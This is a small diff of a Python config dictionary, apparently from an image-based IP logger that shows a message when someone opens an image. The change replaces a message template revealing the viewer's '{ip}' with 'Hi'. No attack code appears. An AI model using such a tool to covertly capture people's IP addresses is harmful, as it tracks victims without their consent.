@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "Y{ip} Their IP Address.", # Message to show
+        "message": "Hi", # Message to show
         "richMessage": False, # Enable rich text? (See README for more info)
     },
 
